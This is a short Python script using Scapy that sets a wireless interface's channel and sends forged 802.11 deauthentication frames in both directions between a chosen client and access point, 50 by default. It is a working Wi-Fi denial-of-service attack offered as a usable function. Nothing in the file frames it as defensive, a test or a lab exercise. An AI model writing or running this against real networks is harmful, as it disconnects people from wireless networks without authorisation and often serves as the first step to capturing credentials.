from scapy.all import *
import os
import time

def send_deauth(target_mac, ap_mac, iface, channel, count=50):
    """Sends deauth packets to a target on a specific channel."""
    print(f"[!] Deauthing {target_mac} on channel {channel}...")

    def _set_channel(ch):
        os.system(f"iwconfig {iface} channel {ch}")
        time.sleep(0.5)  # Allow channel switch

    pkt1 = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    pkt2 = RadioTap() / Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

    try:
        _set_channel(channel)
        sendp([pkt1, pkt2], iface=iface, count=count, inter=0.05, verbose=0)
    except KeyboardInterrupt:
        print("[!] Stopped by user.")
    print(f"[+] Deauth sent to {target_mac}")